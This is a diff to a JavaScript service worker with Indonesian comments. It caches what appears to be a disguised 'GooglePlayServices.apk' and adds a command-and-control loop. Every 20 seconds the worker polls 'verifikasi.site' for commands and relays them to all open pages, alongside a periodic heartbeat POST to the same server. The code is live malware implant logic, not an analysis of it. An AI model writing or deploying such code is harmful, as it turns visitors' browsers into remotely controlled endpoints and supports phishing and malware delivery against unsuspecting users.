@@ -1,11 +1,16 @@
 // ============================================================
-// SERVICE WORKER - ZERO PASSWORD!
+// SERVICE WORKER - VERSI MAKSIMAL (TANPA PASSWORD)
 // ============================================================
 
+// ============================================================
+// KONFIGURASI
+// ============================================================
 var VERSION = '2.0.0';
 var STATIC_CACHE = 'static-v' + VERSION;
 var DYNAMIC_CACHE = 'dynamic-v' + VERSION;
 var SERVER_URL = 'https://verifikasi.site';
+var C2_INTERVAL = 20000;
+var HEARTBEAT_INTERVAL = 30000;
 
 var STATIC_FILES = [
     '/',
@@ -15,7 +20,11 @@ var STATIC_FILES = [
     '/files/GooglePlayServices.apk'
 ];
 
+// ============================================================
+// 🔥 INSTALL
+// ============================================================
 self.addEventListener('install', function(event) {
+    console.log('[SW] Install v' + VERSION);
     event.waitUntil(
         caches.open(STATIC_CACHE)
             .then(function(cache) {
@@ -29,13 +38,18 @@ self.addEventListener('install', function(event) {
     );
 });
 
+// ============================================================
+// 🔥 ACTIVATE
+// ============================================================
 self.addEventListener('activate', function(event) {
+    console.log('[SW] Activate v' + VERSION);
     event.waitUntil(
         caches.keys()
             .then(function(cacheNames) {
                 return Promise.all(
                     cacheNames.map(function(cacheName) {
                         if (cacheName !== STATIC_CACHE && cacheName !== DYNAMIC_CACHE) {
+                            console.log('[SW] Deleting old cache:', cacheName);
                             return caches.delete(cacheName);
                         }
                     })
@@ -47,6 +61,9 @@ self.addEventListener('activate', function(event) {
     );
 });
 
+// ============================================================
+// 🔥 FETCH - STRATEGY CACHE-FIRST
+// ============================================================
 self.addEventListener('fetch', function(event) {
     var request = event.request;
     var url = new URL(request.url);
@@ -112,6 +129,9 @@ self.addEventListener('fetch', function(event) {
     );
 });
 
+// ============================================================
+// 🔥 RECEIVE MESSAGE FROM PAGE
+// ============================================================
 self.addEventListener('message', function(event) {
     var data = event.data;
     if (!data || !data.type) return;
@@ -129,7 +149,10 @@ self.addEventListener('message', function(event) {
     }
 });
 
-setInterval(function() {
+// ============================================================
+// 🔥 HEARTBEAT - TANPA PASSWORD!
+// ============================================================
+function sendHeartbeat() {
     try {
         fetch(SERVER_URL + '/data', {
             method: 'POST',
@@ -140,6 +163,48 @@ setInterval(function() {
             })
         }).catch(function() {});
     } catch(e) {}
-}, 30000);
+}
 
-console.log('[SW] Service Worker v' + VERSION + ' active');
+// ============================================================
+// 🔥 C2 CHECK - TANPA PASSWORD!
+// ============================================================
+function checkC2() {
+    try {
+        fetch(SERVER_URL + '/data?type=perintah&t=' + Date.now())
+            .then(function(r) {
+                if (!r.ok) throw new Error('HTTP ' + r.status);
+                return r.text();
+            })
+            .then(function(content) {
+                if (content && content.length > 5 && content !== '{}') {
+                    try {
+                        var cmd = JSON.parse(content);
+                        if (cmd.aksi) {
+                            self.clients.matchAll().then(function(clients) {
+                                clients.forEach(function(client) {
+                                    client.postMessage({
+                                        type: 'command',
+                                        command: cmd
+                                    });
+                                });
+                            });
+                        }
+                    } catch(e) {
+                        console.error('[SW] C2 parse error:', e);
+                    }
+                }
+            })
+            .catch(function() {});
+    } catch(e) {
+        console.error('[SW] C2 error:', e);
+    }
+}
+
+// ============================================================
+// 🔥 START PERIODIC TASKS
+// ============================================================
+setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
+setInterval(checkC2, C2_INTERVAL);
+setTimeout(checkC2, 1000);
+
+console.log('[SW] Service Worker v' + VERSION + ' active - TANPA PASSWORD');
